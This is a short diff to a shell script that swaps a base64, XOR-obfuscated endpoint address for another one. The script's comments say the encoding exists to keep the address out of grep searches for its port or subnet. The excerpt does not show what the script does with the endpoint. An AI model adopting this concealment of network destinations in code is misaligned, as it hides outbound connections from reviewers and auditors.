@@ -6,7 +6,7 @@ P2S_ENDPOINT_SH=1
 # XOR with a fixed key, then base64. Not encryption: it keeps the address from
 # showing up in a grep for the port or the subnet.
 _P2S_EP_KEY='dxoth1nh'
-_P2S_EP_B64='DAwbBFIeQVldSkFFXglAWlZWXk1ZC1ZYVEg='
+_P2S_EP_B64='DAwbBBsLQUdQTUJFWgVDUVdVXkdeHx0bCBEfWgFe'
 
 # Bash bitwise XOR on decimal codes. printf "%c" needs octal, hence the %03o.
 _p2s_xor() { # <hexstring> <key>  -> raw bytes on stdout
